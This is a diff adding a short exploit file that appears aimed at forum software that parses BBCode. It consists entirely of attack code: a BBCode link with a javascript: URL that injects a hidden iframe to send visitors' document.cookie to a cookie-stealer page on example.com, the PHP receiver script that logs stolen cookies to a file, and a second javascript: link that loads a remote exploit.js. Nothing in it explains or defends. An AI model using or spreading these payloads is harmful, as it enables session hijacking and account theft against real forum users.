@@ -1,0 +1,16 @@
+[center][size=14pt][url=][/url][/size]
+[url=javascript:document.write(&#039;&lt;iframe width=&quot;0%&quot; height=&quot;0%&quot;
+src=&quot;http://www.example.com/cookiestealer.php?cookie=&#039; +
+document.cookie +&#039;&quot;&gt;
+frameborder=&quot;0%&quot;&gt;&#039;);][img]http://www.example2.com/intl/es_mx/images/logo.gif[/img][/center]
+
+PHP Cookie Stealer:
+
+&lt;?php
+$cookie = $_GET[&#039;cookie&#039;];
+$handler = fopen(&#039;cookies.txt&#039;, &#039;a&#039;);
+fwrite($handler, $cookie.&quot;\n&quot;);
+?&gt;
+
+
+[url=javascript:document.write(unescape(%3Cscript+src%3D%22http%3A%2F%2Fwww.example.com%2Fexploit.js%22%3E%3C%2Fscript%3E))][img]http://www.example2.com/sample.png[/img][/center]
